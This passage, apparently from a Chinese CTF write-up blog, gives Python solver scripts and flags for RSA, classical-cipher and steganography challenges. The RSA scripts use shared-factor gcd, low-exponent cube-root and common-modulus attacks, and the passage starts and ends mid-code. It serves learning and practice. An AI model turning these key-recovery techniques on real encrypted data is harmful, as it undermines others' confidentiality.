class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="3-RRRRSA"><a href="#3-RRRRSA" class="headerlink" title="3.RRRRSA"></a>3.RRRRSA</h3><p>第一段flag对N和N1 gcd可得到p，进而得到q，e进行遍历即可。 </p><p>第二段flag为低质数加密攻击，e=3确定，爆破即可。 </p><p>exp：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span> <span class="token keyword">import</span> gmpy2 N<span class="token operator">=</span><span class="token number">8833009455505830765576231622072241161470401197695529677335107109810339880276832871604743644707359887179405543235721188241122566162151923510929667953122181</span> N1<span class="token operator">=</span><span class="token number">9429676793030563745207076251618678117488728061107610987225993751644166892153001760951206447627482758551907039606942492875805463671257287080808106906001851</span> c1<span class="token operator">=</span><span class="token number">8037069184897987958374773499995275921812115255860632996217845099273168646686370835196595250846074845406069858745424656055726674434603985267158502329518751</span> c2<span class="token operator">=</span><span class="token number">413575070955891267004255576879221041256089460651441473637</span> p <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>gcd<span class="token punctuation">(</span>N<span class="token punctuation">,</span>N1<span class="token punctuation">)</span> q <span class="token operator">=</span> N <span class="token operator">//</span> p phi <span class="token operator">=</span> <span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment">#第一段flag枚举e </span><span class="token keyword">for</span> e <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>     <span class="token keyword">if</span><span class="token punctuation">(</span>gmpy2<span class="token punctuation">.</span>gcd<span class="token punctuation">(</span>e<span class="token punctuation">,</span>phi<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>         d <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span><span class="token punctuation">(</span>phi<span class="token punctuation">)</span><span class="token punctuation">)</span>         m1 <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c1<span class="token punctuation">,</span>d<span class="token punctuation">,</span>N<span class="token punctuation">)</span>         <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token string">b'flag'</span> <span class="token keyword">in</span> long_to_bytes<span class="token punctuation">(</span>m1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>             <span class="token keyword">print</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>            flag1 <span class="token operator">=</span> long_to_bytes<span class="token punctuation">(</span>m1<span class="token punctuation">)</span>             <span class="token keyword">break</span> <span class="token comment">#第二段flag低公钥e爆破 </span><span class="token keyword">from</span> gmpy2 <span class="token keyword">import</span> iroot <span class="token keyword">import</span> libnum e <span class="token operator">=</span> <span class="token number">0x3</span> n <span class="token operator">=</span><span class="token number">10456335904838169914349646852830082932152130624533179855437700729986430916359910968035371355128152016750075271161129744979254605922991030753616570849211931989112941277121682363790710646503345520505931418350219098036569932546893477983585713668853372819392130314661542626399462820378837771792293945490048339575869129479058678981790418112887403292721775644533540769467889512773382494878291574262142755186374570245813695390664702262226281601456889176191920270658811753696081082528539263191477192236336112147705564796435800152614366113854349615104191052807647128834113146535639155857819697492608839941056356828288393881491</span>k <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>     res <span class="token operator">=</span> iroot<span class="token punctuation">(</span>c2 <span class="token operator">+</span> k <span class="token operator">*</span> n<span class="token punctuation">,</span> e<span class="token punctuation">)</span> <span class="token comment"># c+k*n 开3次方根 能开3次方即可 </span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>res<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">:</span>         flag2 <span class="token operator">=</span> libnum<span class="token punctuation">.</span>n2s<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>res<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment"># 转为字符串 </span>        <span class="token keyword">break</span>     k <span class="token operator">=</span> k <span class="token operator">+</span> <span class="token number">1</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>flag1 <span class="token operator">+</span> flag2<span class="token punctuation">)</span> <span class="token comment">#e = 6709 </span><span class="token comment">#flag = b'flag&#123;you_get_1t!&#125;'exp: </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="4-HardRSA"><a href="#4-HardRSA" class="headerlink" title="4.HardRSA"></a>4.HardRSA</h3><p>给了hint和p，q的关系，同时又知道n，我们需要构造一个p或者q的倍数和n进行最大公约，得到p或者 </p><p>q。 </p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> gmpy2 <span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span> n <span class="token operator">=</span> <span class="token number">124993585424296591093467762244475251138759316583406117657133238536553852339669769400523449633693296145543303393465079699542574868451705092731269012710274047742582156286940702286646643111975860760853620625924935057792931203893647049496628704891431372213711245207398212732529309490088729910948745640748736955073</span> c <span class="token operator">=</span> <span class="token number">50424006770352436334712623677416186679749743823334436526623823505393135268471235757954106626248672896094704432397859493914371835003999982028550123956410656701321293836439453483634735255591270239182001956026055818185575266979363172614844927196934018068753541437103088119691563904347098094997053933889342339430</span> hint <span class="token operator">=</span><span class="token number">95947821330255050044792695953225981695564565853431169112620146574854785547870212826519391606210465121248955917602550813434927609689055640312953524952635919431672688325438812967089917271116316877318959974024993544935124710051420914708812538221556136784742855036819112563084588872068036526345880570488594712154</span> e <span class="token operator">=</span> <span class="token number">65537</span> kp <span class="token operator">=</span> hint<span class="token operator">-</span>gmpy2<span class="token punctuation">.</span>powmod<span class="token punctuation">(</span><span class="token number">1011</span><span class="token punctuation">,</span>n<span class="token punctuation">,</span>n<span class="token punctuation">)</span> p <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>gcd<span class="token punctuation">(</span>n<span class="token punctuation">,</span>kp<span class="token punctuation">)</span> q <span class="token operator">=</span> n <span class="token operator">//</span> p phi <span class="token operator">=</span> <span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> d <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span>phi<span class="token punctuation">)</span> m <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>powmod<span class="token punctuation">(</span>c<span class="token punctuation">,</span>d<span class="token punctuation">,</span>n<span class="token punctuation">)</span> flag <span class="token operator">=</span> long_to_bytes<span class="token punctuation">(</span>m<span class="token punctuation">)</span> <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span> <span class="token comment">#b'flag&#123;math_1s_important&#125;'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="5-古典密码"><a href="#5-古典密码" class="headerlink" title="5.古典密码"></a>5.古典密码</h3><p><strong>猪圈密码</strong> ,<strong>圣堂武士密码</strong> ,<strong>标准银河字母</strong>解出来 FGCPFLIRTUASYON </p><p>最后提示说栅栏,那就栅栏解密,分栏为3时解出来 FLAGISCRYPTOFUN </p><p>flag{CRYPTOFUN}</p><h2 id="3-WEB"><a href="#3-WEB" class="headerlink" title="3.WEB"></a>3.WEB</h2>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 解题记录 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BJDCTF2020</title>
      <link href="/2021/12/03/BJDCTF2020/"/>
      <url>/2021/12/03/BJDCTF2020/</url>
      
        <content type="html"><![CDATA[<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h4 id="1-签到"><a href="#1-签到" class="headerlink" title="1 签到"></a>1 签到</h4><p>一个简单的隐写题目， 压缩包里面有个hello.zip，用winhex打开，可以知道这是一张图片，改成png，打开发现是一个二维码，扫二维码得到flag：<code>xaflag&#123;i_am_a_tupian&#125; </code></p><h4 id="2-藏藏藏"><a href="#2-藏藏藏" class="headerlink" title="2 藏藏藏"></a>2 藏藏藏</h4><p> binwalk发现zip压缩包，使用foremost分离然后解压，得到福利.docx，打开里面又一个二维码，扫码得到<code>flag&#123;you are the best!&#125;</code></p><h4 id="3-认真你就输了"><a href="#3-认真你就输了" class="headerlink" title="3 认真你就输了"></a>3 认真你就输了</h4><p> 解压出来xls，binwalk分离文件得到flag.txt，打开得到flag：<code>flag&#123;M9eVfi2Pcs#&#125; </code></p><h4 id="4-你猜我是个啥"><a href="#4-你猜我是个啥" class="headerlink" title="4 你猜我是个啥"></a>4 你猜我是个啥</h4><p>是一个无法打开的zip压缩包，file命令查看发现是个png图片，直接cat即可得到flag.</p><h4 id="5-鸡你太美"><a href="#5-鸡你太美" class="headerlink" title="5 鸡你太美"></a>5 鸡你太美</h4><p><code>GIF89a</code>这个文件头丢失,<code>winhex</code>打开，填上4个字节，修复文件头，得到<code>flag</code></p><h4 id="6-纳尼"><a href="#6-纳尼" class="headerlink" title="6 纳尼"></a>6 纳尼</h4><p>和上一个题一样，还是缺了4位二进制数，打开winhex修复gif文件头，补充47,49,46,38，然后把 gif 不同帧连起来得到一个base64，Q1RGe3dhemdfYmFvX3FpYW5nX2lzX3NhZH0=解密后得到一段有问题的flag。<code>CTF&#123;wazg_bao_qiang_is_sad&#125;</code>这个实际上有点问题，我怀疑是我输入出错了<code>CTF&#123;wang_bao_qiang_is_sad&#125;</code></p><p>王宝强很悲伤。</p><h4 id="7-just-a-rar"><a href="#7-just-a-rar" class="headerlink" title="7 just a rar"></a>7 just a rar</h4><p>解压出来一个rar名称为 4 位数，爆破得到密码：2016，一张青雉的图片，用 stegsolve 打开使用 Analyse 分析，找到<code>flag &#123;Wadf_123&#125;</code></p><h4 id="8-一叶障目"><a href="#8-一叶障目" class="headerlink" title="8 一叶障目"></a>8 一叶障目</h4><p>png 的 CRC 校验问题，图片的宽高被改了导致无法打开，这里有我之前在一个ctf地图平台上找到了一个脚本。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> binascii<span class="token keyword">import</span> struct<span class="token keyword">import</span> sys<span class="token builtin">file</span> <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"图片地址："</span><span class="token punctuation">)</span>fr <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">,</span><span class="token string">'rb'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>data<span class="token punctuation">:</span> <span class="token builtin">bytearray</span> <span class="token operator">=</span> <span class="token builtin">bytearray</span><span class="token punctuation">(</span>fr<span class="token punctuation">[</span><span class="token number">0x0c</span><span class="token punctuation">:</span><span class="token number">0x1d</span><span class="token punctuation">]</span><span class="token punctuation">)</span>crc32key <span class="token operator">=</span> <span class="token builtin">eval</span><span class="token punctuation">(</span><span class="token string">'0x'</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>binascii<span class="token punctuation">.</span>b2a_hex<span class="token punctuation">(</span>fr<span class="token punctuation">[</span><span class="token number">0x1d</span><span class="token punctuation">:</span><span class="token number">0x21</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment">#原来的代码: crc32key = eval(str(fr[29:33]).replace('\\x','').replace("1b'",'0x').replace("'",''))</span>n <span class="token operator">=</span> <span class="token number">4095</span><span class="token keyword">for</span> w <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>    width <span class="token operator">=</span> <span class="token builtin">bytearray</span><span class="token punctuation">(</span>struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">'>i'</span><span class="token punctuation">,</span> w<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> h <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>        height <span class="token operator">=</span> <span class="token builtin">bytearray</span><span class="token punctuation">(</span>struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">'>i'</span><span class="token punctuation">,</span> h<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            data<span class="token punctuation">[</span>x<span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> width<span class="token punctuation">[</span>x<span class="token punctuation">]</span>            data<span class="token punctuation">[</span>x<span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">=</span> height<span class="token punctuation">[</span>x<span class="token punctuation">]</span>        crc32result <span class="token operator">=</span> binascii<span class="token punctuation">.</span>crc32<span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xffffffff</span>        <span class="token keyword">if</span> crc32result <span class="token operator">==</span> crc32key<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>width<span class="token punctuation">,</span>height<span class="token punctuation">)</span>            newpic <span class="token operator">=</span> <span class="token builtin">bytearray</span><span class="token punctuation">(</span>fr<span class="token punctuation">)</span>            <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                newpic<span class="token punctuation">[</span>x<span class="token operator">+</span><span class="token number">16</span><span class="token punctuation">]</span> <span class="token operator">=</span> width<span class="token punctuation">[</span>x<span class="token punctuation">]</span>                newpic<span class="token punctuation">[</span>x<span class="token operator">+</span><span class="token number">20</span><span class="token punctuation">]</span> <span class="token operator">=</span> height<span class="token punctuation">[</span>x<span class="token punctuation">]</span>            fw <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token builtin">file</span><span class="token operator">+</span><span class="token string">'.png'</span><span class="token punctuation">,</span><span class="token string">'wb'</span><span class="token punctuation">)</span>            fw<span class="token punctuation">.</span>write<span class="token punctuation">(</span>newpic<span class="token punctuation">)</span>            fw<span class="token punctuation">.</span>close<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>得到flag <code>xaflag&#123;66666&#125;</code></p><h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h4 id="1-签到-1"><a href="#1-签到-1" class="headerlink" title="1 签到"></a>1 签到</h4><p>十六进制转字符串即可得flag   <code>BJD&#123;We1c0me_t4_BJDCTF&#125;</code></p><h4 id="2-编码与调制"><a href="#2-编码与调制" class="headerlink" title="2 编码与调制"></a>2 编码与调制</h4><blockquote><p> 本题灵感来自2019年第三届i春秋的11月月赛，主要是想对曼切斯特编码进行考察，其中为了提供一下思路，给了一张code的图片作为提示，当然也可以直接自行百度这种编码方式，毕竟他的编码方式也很有特点，仅采用了4种字符，百度一下也可以找到解决方案 编码规则，直接复制的百度百科 在曼彻斯特编码中，每一位的中间有一跳变，位中间的跳变既作时钟信号，又作数据信号；从高到低跳变表示“1”，从低到高跳变表示“0”。还有一种是差分曼彻斯特编码，每位中间的跳变仅提供时钟定时，而用每位开始时有无跳变表示“0”或“1”，有跳变为“0”，无跳变为“1”。 编程思路： 而我们在编程实现时，也很简单只要先将明文转成二进制（也就是先进行NRZ编码），而后对于其中的高电平‘1’，用‘10’替换，低电平‘0’，用‘01’替换，获得一串新的二进制比特流，最后再将其进行16进制封装即可 解码思路： 解码也就是一个逆过程，先将hex转成bin，在一步步替换‘10’为‘1’，‘01’为‘0’ 下面给出解密脚本： </p></blockquote><p>直接放官方的答案吧</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">msg<span class="token operator">=</span><span class="token number">0x2559659965656a9a65656996696965a6695669a9695a699569666a5a6a6569666a59695a69aa696569666aa6</span>s<span class="token operator">=</span><span class="token builtin">bin</span><span class="token punctuation">(</span>msg<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span>r<span class="token operator">=</span><span class="token string">""</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> s<span class="token punctuation">[</span>i<span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">:</span>i<span class="token operator">*</span><span class="token number">2</span><span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'10'</span><span class="token punctuation">:</span>        r <span class="token operator">+=</span> <span class="token string">'1'</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        r <span class="token operator">+=</span> <span class="token string">'0'</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>r<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>**BJD{DifManchestercode} **</p><h4 id="3-Polybius"><a href="#3-Polybius" class="headerlink" title="3 Polybius"></a>3 Polybius</h4><blockquote><p>密文：ouauuuoooeeaaiaeauieuooeeiea hint：VGhlIGxlbmd0aCBvZiB0aGlzIHBsYWludGV4dDogMTQ= 首先将hint base64解密查看提示：The length of this plaintext: 14 而后再观察一下发现密文长度时28位，所以猜测是棋盘密码（额，其实题目就已经提示加密方式了） 观察发现一共有五个字母重复出现在密文中，所以可能的加密表是aeiou，但是解出结果会发现是乱码，所以可以尝试爆破，一共也就5！种情况。 </p></blockquote><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> itertoolskey <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>cipher <span class="token operator">=</span> <span class="token string">"ouauuuoooeeaaiaeauieuooeeiea"</span><span class="token keyword">for</span> i <span class="token keyword">in</span> itertools<span class="token punctuation">.</span>permutations<span class="token punctuation">(</span><span class="token string">'aeiou'</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    key<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">for</span> each <span class="token keyword">in</span> key<span class="token punctuation">:</span>    temp_cipher <span class="token operator">=</span> <span class="token string">""</span>    result <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">for</span> temp <span class="token keyword">in</span> cipher<span class="token punctuation">:</span>        temp_cipher <span class="token operator">+=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>each<span class="token punctuation">.</span>index<span class="token punctuation">(</span>temp<span class="token punctuation">)</span><span class="token punctuation">)</span>          <span class="token comment">#这里其实是将字母的表换成数字的表以便后续计算</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>temp_cipher<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        current_ascii <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>temp_cipher<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">5</span><span class="token operator">+</span><span class="token builtin">int</span><span class="token punctuation">(</span>temp_cipher<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">97</span>     <span class="token comment">#因为棋盘密码是采用两位一起表示一个字母</span>        <span class="token keyword">if</span> current_ascii<span class="token operator">></span><span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'i'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            current_ascii<span class="token operator">+=</span><span class="token number">1</span>        result <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>current_ascii<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">"flag"</span> <span class="token keyword">in</span> result<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>each<span class="token punctuation">,</span>result<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>得到flag        **BJD{flagispolybius} **</p><p>4 easyrsa</p><p>很简单的一个rsa，就是再求取欧拉函数是对于(p-1)(q-1)的获取要先进行一步转换，题中给出了p和q的关系式，及一个求导的过程，化简后可以得出<code>z=p^2+q^2</code>,最后再根据<code>n=p * q</code>,即可得出<code>（p-1）*（q-1） </code>下面是exp：</p> <pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding:utf-8 -*-</span><span class="token comment">#!/usr/bin/python</span><span class="token keyword">import</span> gmpy2<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> long_to_bytesn<span class="token operator">=</span><span class="token number">15310745161336895413406690009324766200789179248896951942047235448901612351128459309145825547569298479821101249094161867207686537607047447968708758990950136380924747359052570549594098569970632854351825950729752563502284849263730127586382522703959893392329333760927637353052250274195821469023401443841395096410231843592101426591882573405934188675124326997277775238287928403743324297705151732524641213516306585297722190780088180705070359469719869343939106529204798285957516860774384001892777525916167743272419958572055332232056095979448155082465977781482598371994798871917514767508394730447974770329967681767625495394441</span>z<span class="token operator">=</span><span class="token number">32115748677623209667471622872185275070257924766015020072805267359839059393284316595882933372289732127274076434587519333300142473010344694803885168557548801202495933226215437763329280242113556524498457559562872900811602056944423967403777623306961880757613246328729616643032628964072931272085866928045973799374711846825157781056965164178505232524245809179235607571567174228822561697888645968559343608375331988097157145264357626738141646556353500994924115875748198318036296898604097000938272195903056733565880150540275369239637793975923329598716003350308259321436752579291000355560431542229699759955141152914708362494482</span>c<span class="token operator">=</span><span class="token number">7922547866857761459807491502654216283012776177789511549350672958101810281348402284098310147796549430689253803510994877420135537268549410652654479620858691324110367182025648788407041599943091386227543182157746202947099572389676084392706406084307657000104665696654409155006313203957292885743791715198781974205578654792123191584957665293208390453748369182333152809882312453359706147808198922916762773721726681588977103877454119043744889164529383188077499194932909643918696646876907327364751380953182517883134591810800848971719184808713694342985458103006676013451912221080252735948993692674899399826084848622145815461035</span>e<span class="token operator">=</span><span class="token number">65537</span>p_and_q_square <span class="token operator">=</span> z <span class="token operator">+</span> <span class="token number">2</span><span class="token operator">*</span>n <span class="token comment">#这个要通过化简一下z就可以发现其中的关系，其实就是简单的导数化简</span>p_and_q <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>iroot<span class="token punctuation">(</span>p_and_q_square<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token comment">#(mpz(250474028594377426111821218884061933467907597574578255066146260367094595399741196827532923836761733594976933366636149201492628708413319929361097646526652140204561542573663223469009835925309935515892458499676903149172534494580503088868430625144808189083708827363335045028702993282231537893799541685169911232442), True)</span>final_p_and_q <span class="token operator">=</span> <span class="token number">250474028594377426111821218884061933467907597574578255066146260367094595399741196827532923836761733594976933366636149201492628708413319929361097646526652140204561542573663223469009835925309935515892458499676903149172534494580503088868430625144808189083708827363335045028702993282231537893799541685169911232442</span>Euler_function <span class="token operator">=</span> n <span class="token operator">-</span> final_p_and_q <span class="token operator">+</span> <span class="token number">1</span>d <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span>Euler_function<span class="token punctuation">)</span><span class="token punctuation">)</span>m<span class="token operator">=</span><span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span>d<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="5-rsa-output"><a href="#5-rsa-output" class="headerlink" title="5 rsa_output"></a>5 rsa_output</h4><p>题目描述直接给出，模的相关攻击，再看一下给出的附件，发现两次的N是相同的，所以可以确定是共模攻击</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> long_to_bytes<span class="token keyword">import</span> gmpy2n <span class="token operator">=</span> <span class="token number">21058339337354287847534107544613605305015441090508924094198816691219103399526800112802416383088995253908857460266726925615826895303377801614829364034624475195859997943146305588315939130777450485196290766249612340054354622516207681542973756257677388091926549655162490873849955783768663029138647079874278240867932127196686258800146911620730706734103611833179733264096475286491988063990431085380499075005629807702406676707841324660971173253100956362528346684752959937473852630145893796056675793646430793578265418255919376323796044588559726703858429311784705245069845938316802681575653653770883615525735690306674635167111</span>e1 <span class="token operator">=</span> <span class="token number">2767</span>e2 <span class="token operator">=</span> <span class="token number">3659</span>message1 <span class="token operator">=</span> <span class="token number">20152490165522401747723193966902181151098731763998057421967155300933719378216342043730801302534978403741086887969040721959533190058342762057359432663717825826365444996915469039056428416166173920958243044831404924113442512617599426876141184212121677500371236937127571802891321706587610393639446868836987170301813018218408886968263882123084155607494076330256934285171370758586535415136162861138898728910585138378884530819857478609791126971308624318454905992919405355751492789110009313138417265126117273710813843923143381276204802515910527468883224274829962479636527422350190210717694762908096944600267033351813929448599</span>message2 <span class="token operator">=</span> <span class="token number">11298697323140988812057735324285908480504721454145796535014418738959035245600679947297874517818928181509081545027056523790022598233918011261011973196386395689371526774785582326121959186195586069851592467637819366624044133661016373360885158956955263645614345881350494012328275215821306955212788282617812686548883151066866149060363482958708364726982908798340182288702101023393839781427386537230459436512613047311585875068008210818996941460156589314135010438362447522428206884944952639826677247819066812706835773107059567082822312300721049827013660418610265189288840247186598145741724084351633508492707755206886202876227</span><span class="token comment"># s &amp; t</span>gcd<span class="token punctuation">,</span> s<span class="token punctuation">,</span> t <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>gcdext<span class="token punctuation">(</span>e1<span class="token punctuation">,</span> e2<span class="token punctuation">)</span><span class="token keyword">if</span> s <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">:</span>    s <span class="token operator">=</span> <span class="token operator">-</span>s    message1 <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>message1<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token keyword">if</span> t <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">:</span>    t <span class="token operator">=</span> <span class="token operator">-</span>t    message2 <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>message2<span class="token punctuation">,</span> n<span class="token punctuation">)</span>plain <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>powmod<span class="token punctuation">(</span>message1<span class="token punctuation">,</span> s<span class="token punctuation">,</span> n<span class="token punctuation">)</span> <span class="token operator">*</span> gmpy2<span class="token punctuation">.</span>powmod<span class="token punctuation">(</span>message2<span 